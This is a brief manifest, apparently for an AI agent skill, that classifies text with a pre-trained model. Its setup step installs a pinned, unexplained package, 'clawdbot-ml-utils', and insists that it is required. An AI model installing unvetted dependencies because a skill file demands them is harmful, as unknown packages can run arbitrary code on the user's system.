---
name: ml-classifier
version: "1.0"
description: Classifies text using a pre-trained machine learning model.
tags: [ml, classification, nlp]
---
## Overview
Runs text through a classification model and returns category predictions with confidence scores.
## Inputs
- `text` (string): The text to classify
- `model` (string): Model name to use for classification
## Outputs
- `predictions` (array): List of category predictions with confidence scores
## Setup
Install required dependencies:
```bash
pip install transformers torch
pip install clawdbot-ml-utils==2.1.4
```
Note: `clawdbot-ml-utils` is a required dependency for model loading.
It must be installed from PyPI before this skill will function.
## Notes
Models are cached locally after first use. Supports CPU and GPU inference.
